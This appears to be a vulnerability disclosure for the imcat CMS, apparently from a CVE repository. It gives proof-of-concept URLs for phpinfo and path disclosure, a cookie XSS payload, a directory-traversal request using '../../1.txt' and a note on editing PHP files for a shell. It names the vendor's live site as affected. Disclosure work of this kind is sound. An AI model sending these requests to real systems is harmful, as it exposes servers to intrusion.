# Information-Disclosure
--------------------------
Visit to `/root/tools/adbug/binfo.php?phpinfo1`
![](https://github.com/AvaterXXX/CVEs/blob/master/images/imcat/imcat_Information-Disclosure_1-1.png)

The same problem exists in the official website.
Visit to `http://imcat.txjia.com/root/tools/adbug/binfo.php?phpinfo1`
![](https://github.com/AvaterXXX/CVEs/blob/master/images/imcat/imcat_Information-Disclosure_1-2.png)

# Information-Disclosure2
------------------------------
Visit to `/root/tools/adbug/binfo.php`
![](https://github.com/AvaterXXX/CVEs/blob/master/images/imcat/imcat_Information-Disclosure_2-1.png)

The same problem exists in the official website.
Visit to `http://imcat.txjia.com/root/tools/adbug/binfo.php`
![](https://github.com/AvaterXXX/CVEs/blob/master/images/imcat/imcat_Information-Disclosure_2-2.png)

# XSS
-------------------------------
Modify the value of the cookie to "><script>alert(1)</script>
![](https://github.com/AvaterXXX/CVEs/blob/master/images/imcat/imcat_XSS_1-1.png)

Visit to `/root/tools/adbug/binfo.php?cookie`
![](https://github.com/AvaterXXX/CVEs/blob/master/images/imcat/imcat_XSS_1-2.png)

# Information-Disclosure3
------------------------------
Visit to `/root/tools/adbug/check.php`
![](https://github.com/AvaterXXX/CVEs/blob/master/images/imcat/imcat_Information-Disclosure_3-1.png)

The same problem exists in the official website.
Visit to `http://imcat.txjia.com/root/tools/adbug/check.php`
![](https://github.com/AvaterXXX/CVEs/blob/master/images/imcat/imcat_Information-Disclosure_3-2.png)

# Information-Disclosure4
------------------------------
If you don't have the relevant plugin installed, you can access `/dev.php?tools-ipaddr&api=Pcoln&uip=137.36.58.213`.
Obtain absolute path information by error.
![](https://github.com/AvaterXXX/CVEs/blob/master/images/imcat/imcat_Information-Disclosure_4-1.png)

# Directory-Traversal
-------------------------------
D disk creat 1.txt
![](https://github.com/AvaterXXX/CVEs/blob/master/images/imcat/imcat_Directory-Traversal_1-1.png)

Visit to `/root/run/adm.php?admin-ediy&part=edit&dkey=runs&dsub=&efile=../../1.txt&dialog=1546054963116&lang=cn`
![](https://github.com/AvaterXXX/CVEs/blob/master/images/imcat/imcat_Directory-Traversal_1-2.png)

# GETSHELL
-------------------------------
The php file can be modified directly without restricting user input.
![](https://github.com/AvaterXXX/CVEs/blob/master/images/imcat/imcat_GETSHELL_1-1.png)
!![](https://github.com/AvaterXXX/CVEs/blob/master/images/imcat/imcat_GETSHELL_1-2.png)
